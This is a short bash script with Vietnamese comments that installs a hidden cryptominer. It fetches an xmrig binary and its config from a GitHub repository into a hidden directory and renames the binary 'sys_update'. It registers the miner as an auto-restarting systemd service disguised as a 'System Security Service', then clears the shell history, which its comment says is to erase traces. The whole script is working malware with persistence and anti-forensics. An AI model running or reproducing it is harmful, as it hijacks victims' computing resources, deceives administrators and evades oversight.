#!/bin/bash

# 1. Gỡ bỏ mọi rào cản nếu có
systemctl stop sys_update.service 2>/dev/null
systemctl disable sys_update.service 2>/dev/null

# 2. Tạo thư mục ẩn
mkdir -p /var/opt/.system_lib

# 3. Tải file (Sử dụng -sL để tránh lỗi link Github redirect)
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -o /var/opt/.system_lib/config.json
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.system_lib/sys_update

# 4. Cấp quyền thực thi
chmod +x /var/opt/.system_lib/sys_update

# 5. Tạo Service (Dùng EOF để viết file nhiều dòng cho sạch)
cat <<EOF > /etc/systemd/system/sys_update.service
[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
ExecStart=/var/opt/.system_lib/sys_update --config=/var/opt/.system_lib/config.json
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# 6. Kích hoạt và chạy
systemctl daemon-reload
systemctl enable sys_update
systemctl start sys_update

# 7. Xóa dấu vết (Xóa chính file script này sau khi chạy xong)
history -c
